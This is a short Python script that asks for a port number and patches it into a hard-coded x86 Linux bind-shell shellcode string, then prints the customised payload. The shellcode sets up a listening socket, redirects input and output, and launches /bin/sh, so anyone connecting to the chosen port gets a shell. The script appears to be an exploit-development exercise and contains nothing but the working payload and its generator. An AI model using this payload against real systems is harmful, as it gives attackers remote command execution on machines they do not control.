import sys
import socket

port = input("Select a 4 digit port number ")

shellcode = "\\x31\\xc0\\x31\\xdb\\x43\\x50\\x6a\\x01\\x6a\\x02\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x43\\x31\\xd2\\x52\\x66\\x68\\x05\\x39\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x01\\xdb\\x53\\x57\\x89\\xe1\\xcd\\x80\\x6a\\x66\\x58\\x43\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

port = int(port)

port = hex(port)

if len(port) == 5:
	pos = port.find('x')
	pos += 1
	print(port)
	print('\n')
	hexport = "\\x0" + port[2] + "\\x" + port[3:]
	print("New port: " + hexport)
	newshellcode = shellcode.replace('\\x05\\x39', hexport)
	print(newshellcode)
else:
	hexport = "\\x" + port[2:4] + "\\x" + port[4:]
	print("\n")
	print("New port in hex: " + hexport)
	print("\n")
	newshellcode = shellcode.replace('\\x05\\x39', hexport)
	print(newshellcode)


